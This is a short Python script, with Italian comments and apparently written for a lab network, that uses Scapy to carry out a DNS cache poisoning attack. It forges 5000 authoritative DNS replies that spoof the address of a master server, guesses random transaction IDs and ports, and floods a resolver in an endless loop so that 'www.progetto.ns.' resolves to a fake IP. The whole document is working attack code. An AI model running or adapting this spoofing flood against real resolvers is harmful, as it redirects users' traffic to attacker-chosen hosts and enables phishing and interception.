from scapy.all import *
import random

# --- CONFIGURAZIONE ---
resolver_ip = "172.20.0.53"
master_to_spoof = "10.0.1.53"
target_domain = "www.progetto.ns."
fake_ip = "172.20.0.80"
# ----------------------

print(f"[*] ATTACCO L2: {master_to_spoof} -> {resolver_ip}")

# Generazione 5000 varianti per massimizzare la velocità
pkts = []
for _ in range(5000):
    p = Ether(dst="ff:ff:ff:ff:ff:ff") / \
        IP(dst=resolver_ip, src=master_to_spoof) / \
        UDP(sport=53, dport=random.randint(32768, 65535)) / \
        DNS(id=random.randint(1, 65535), qr=1, aa=1,
            qd=DNSQR(qname=target_domain),
            an=DNSRR(rrname=target_domain, rdata=fake_ip, ttl=3600))
    pkts.append(p)

try:
    while True:
        sendp(pkts, iface="eth0", verbose=0)
except KeyboardInterrupt:
    print("\n[!] Stop.")